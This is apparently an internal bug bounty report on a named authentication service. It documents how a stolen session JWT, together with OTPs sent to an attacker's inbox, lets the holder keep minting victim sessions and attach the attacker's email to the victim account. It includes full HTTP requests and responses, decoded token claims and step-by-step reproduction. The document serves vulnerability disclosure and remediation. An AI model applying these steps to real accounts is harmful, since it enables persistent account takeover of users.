# BUG-003 — Email verification binding absent: stolen session JWT converts to persistent self-sustaining access via attacker-inbox OTP

- **Target:** `app.dynamicauth.com` (API v0 SDK auth service) — serves `app.dynamic.xyz` dashboard authentication
- **Severity assessment:** **P2** (stolen-session precondition — same model as the accepted webhook-secret finding; impact: persistent, self-sustaining identity control of a victim end-user account with zero victim interaction)
- **Researcher:** zeno0 (zeno0@bugcrowdninja.com)
- **Date:** 2026-10-26, 11:18–11:58 UTC
- **Status:** Not submitted yet — internal report for triage review

## 1. Summary

The SDK email-verification step-up family (`/sdk/{environmentId}/emailVerifications/create|verify|signin`) performs **no binding between the OTP destination email and the account that owns the session** completing the verification. The `create` endpoint is fully unauthenticated and accepts an arbitrary caller-chosen email. The `verify` endpoint authenticates the caller with (a) a session JWT and (b) the session's **public** key — which is handed to the attacker inside the JWT itself (`session_public_key` claim) — and then treats an OTP delivered to **any** inbox as valid for attaching that email to the victim account and minting a fresh session for the victim user.

Consequence: an attacker who obtains a victim session JWT (transient, ≤24h, no private key material required) can, using only OTPs delivered to their own inbox, repeatedly mint fresh sessions for the victim user — **indefinitely** (each minted session is itself a valid verify-authorization token; one live session is retained across rotation). The attacker email additionally persists on the victim account as a verified credential with `signInEnabled: true`.

## 2. Preconditions

1. Attacker holds a victim SDK session JWT (stolen via any session-theft vector; the JWT contains everything needed — see §4.2). No session private key, no device key, no victim interaction, no OTP to the victim.
2. Attacker controls an inbox they can read (any email address).

## 3. Legitimate baseline (control)

The flow under test is a real Dynamic feature (email sign-in / add-verified-email). A fully legitimate run was executed first to establish the baseline:

```
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/signin
Content-Type: application/json

{"verificationUUID":"8cc8a967-6b48-4b38-8a7a-e0477e9ce930",
 "verificationToken":"731742",                      <- OTP for zeno0+sdk1@bugcrowdninja.com (own email)
 "sessionPublicKey":"3059301306072a8648ce3d02...0420004cff141e9..."}   <- SPKI-DER-hex, 91 bytes

HTTP/1.1 200
{"jwt":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjY1YWViZDg2...","minifiedJwt":"...","user":{...},"expiresAt":1793099925}
```

Decoded session claims: `sub: d0e3d92e-2377-44a3-921e-e30dca293a85`, `sid: 96d72f80-babf-4259-b480-093272b76313`, `email: zeno0+sdk1@bugcrowdninja.com`, `scope: user:basic`, and — critically — **`session_public_key: 3059301306072a8648ce3d020106082a8648ce3d03010703420004cff141e9cbaed321...`** (plaintext, attacker-readable).

The same session key format (SPKI-DER-hex) is accepted by `verify`; the 33-byte compressed-point format is rejected (`422 invalid_session_public_key`).

## 4. Attack chain (end-to-end verified)

### 4.1 Step 1 — unauthenticated verification creation for the attacker email

```
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/create
Content-Type: application/json

{"email":"zeno0+ev6@bugcrowdninja.com","purpose":"wallet:export"}

HTTP/1.1 201
{"verificationUUID":"3005a800-658e-437d-b9e8-d6181db89543","email":"zeno0+ev6@bugcrowdninja.com"}
```

- No authentication of any kind.
- The `email` (OTP destination) is fully attacker-chosen. An OTP was delivered to that inbox.
- `purpose` is accepted unvalidated (garbage strings such as `totally:madeup:scope` also return 201).

### 4.2 Step 2 — verify with victim session + victim PUBLIC key + attacker-inbox OTP

The victim session public key is read directly from the `session_public_key` claim of the stolen JWT. No signature is produced; possession of the private key is never checked at this layer.

```
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/verify
Authorization: Bearer <victim session minifiedJwt>     <- stolen token
Content-Type: application/json

{"verificationUUID":"3005a800-658e-437d-b9e8-d6181db89543",
 "verificationToken":"454288",                          <- OTP from ATTACKER inbox (zeno0+ev6@)
 "sessionPublicKey":"3059301306072a8648ce3d02...0420004cff141e9..."}   <- victim PUBLIC key, from JWT claim

HTTP/1.1 200
{"jwt":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjY1YWViZDg2...",
 "minifiedJwt":"...",
 "user":{"id":"d0e3d92e-2377-44a3-921e-e30dca293a85", "lastVerifiedCredentialId":"c3fe17fa-f2ab-430a-8709-c042ec1fae2a",
         "verifiedCredentials":[{"email":"zeno0+ev6@bugcrowdninja.com","id":"c3fe17fa-f2ab-430a-8709-c042ec1fae2a",
                                 "format":"email","signInEnabled":true,"verifiedAt":"2026-10-26T11:37:05.123Z"}]},
 "nextView":"done","expiresAt":1793101025}
```

Decoded minted-session claims:

```json
{
  "sub": "d0e3d92e-2377-44a3-921e-e30dca293a85",     <- VICTIM user id
  "sid": "14d452b5-b210-4bbf-8e3f-c1bca2649bc8",     <- fresh session
  "email": "zeno0+ev6@bugcrowdninja.com",            <- ATTACKER email as the session identity email
  "session_public_key": "3059...f2",                 <- unchanged victim key
  "signin_credential_id": "25340912-047b-403e-8c8e-22745fa26520",   <- original victim credential still referenced
  "last_verified_credential_id": "c3fe17fa-...",     <- attacker email now a verified credential
  "scope": "user:basic", "iat": 1793014625, "exp": 1793101025, "refreshExp": 1795606625
}
```

**Result:** OTP delivered to an email that does not belong to the session's account was accepted, the attacker email was attached to the victim account as a verified credential (`signInEnabled: true`), and a fresh 24h session for the victim user was issued. The victim receives nothing.

### 4.3 Step 3 — chain: the minted session re-arms the next hop

The minted session was itself accepted as verify authorization. A second verification (`ad17cff9-…`, OTP for the account's own email, captured partially) returned a further fresh session for the same victim user with identical semantics. Each mint rotates the previous session (`401 "Session is no longer active"` on the superseded token), so exactly one live session persists — **the attacker's**. Since `create` is unauthenticated and OTPs to the attacker inbox are unlimited, the chain is self-sustaining for as long as the attacker chooses:

```
stolen JWT (day 0) -> verify(OTP @ attacker) -> session_1 (24h)
session_1 -> verify(OTP @ attacker) -> session_2 (24h) -> ...
```

### 4.4 Control comparison

The identical call with an OTP delivered to the account's own email (`zeno0+sdk1@`, OTP `512422`) returned the same 200 flow and re-attached the own email. The server exhibits **zero behavioral difference** between "OTP for the account's own email" and "OTP for any other email" — the binding simply does not exist.

### 4.5 Validation-order diagnostics (why the public key check does not protect this)

Empirically established check order on `verify`:

1. **Authorization token** must be a Dynamic session token (full JWT form → `401 Invalid token`; minified form accepted).
2. **`sessionPublicKey` param must equal the Authorization session's registered public key** — a public-value comparison (`422 invalid_session_public_key` "Client public key does not match the expected client public key. Reauthenticate and try again." when mismatched). Since the key is public and present in the JWT claim, any holder of the JWT passes. Private-key possession is never demonstrated at this layer.
3. **UUID + OTP** validated (`422 invalid_email_verification` when expired/consumed).
4. Mint + attach.

## 5. Impact

- **Persistent self-sustaining access to the victim user identity** from a single stolen session JWT, with no time limit, no victim interaction, and no OTP ever sent to the victim.
- **Attacker email attached as a verified credential on the victim account** (`signInEnabled: true`) — a durable account artifact: identity confusion in any downstream consumer of the account's verified emails (notifications, recovery routing, org invite matching), and the minted sessions carry the attacker email in the `email` claim while acting as the victim `sub`.
- **Session-window extension**: a stolen JWT's ≤24h life becomes an indefinitely renewable one via re-mint.

## 6. Boundaries held / falsified paths (verified honestly)

| Path | Result |
|---|---|
| Sign-in via the attached email reaches the victim account | **Falsified** — `signin` with the attached email created a separate new account (`sub 3428fdb3-…`, new credential `71115da2-…`, `newUser: true`); the sign-in index does not route to the victim user |
| Wallet key export via this chain | **Blocked** — `POST /sdk/{env}/waas/{walletId}/privateKey/export` enforces elevated-token validation (tested: garbage / replayed JWT / backup token all `403`); wallet-family endpoints (`users/embeddedWallets`, `sessionKey` rotation with optional `prevSessionKeySignature`) reject SDK session JWTs entirely (`401`) — no wallet-level credential could be provisioned (`authToken` route not deployed: `404 Cannot GET`) |
| Wallet provisioning on the test env | `automaticEmbeddedWalletCreation: true`, `waas.exportDisabled: false` on the environment; wallet create reached validation (400 revealing `embeddedWallets` body shape) but authorization-blocked — wallet boundary untestable further without a wallet credential |
| Rate limits | Cloudflare `429` (error 1015) on verify bursts — slows but does not impede the chain (one request per hop, ~minutes apart) |

## 7. Reproduction

1. Obtain any valid SDK session JWT for the target environment (and note `session_public_key` from its claims).
2. `POST /sdk/{env}/emailVerifications/create` with `{"email":"<attacker inbox>"}` (no auth) → `verificationUUID`.
3. Read the OTP from the attacker inbox.
4. `POST /sdk/{env}/emailVerifications/verify` with `Authorization: Bearer <minifiedJwt>`, body `verificationUUID`, `verificationToken` (OTP), `sessionPublicKey` (from step 1 claims) → 200 + fresh victim-user session + attacker email attached.
5. Repeat 2–4 using the minted session as the new Authorization — indefinitely.

## 8. Suggested remediation

- Bind the verification (at `create` time) to the authenticated session/user context, and reject at `verify` when the OTP destination email does not belong to the session's user (or when `create` was unauthenticated and the verify carries a session).
- Require proof-of-possession of the session private key at `verify` (challenge signed by the session key) instead of a public-key equality check.
- Stop emitting `session_public_key` in session JWT claims.
- Restrict `purpose` to an enum; do not accept arbitrary scope strings.

## 9. Test-identity note

All testing used researcher-owned identities on environment `fb6dd9d1` (dashboard-login env): `zeno0+sdk1@bugcrowdninja.com` (user `d0e3d92e-…`), `zeno0+ev6@bugcrowdninja.com` (attached credential + separate account `3428fdb3-…`). No third-party user data was accessed. Recommend cleanup of these test identities post-triage.
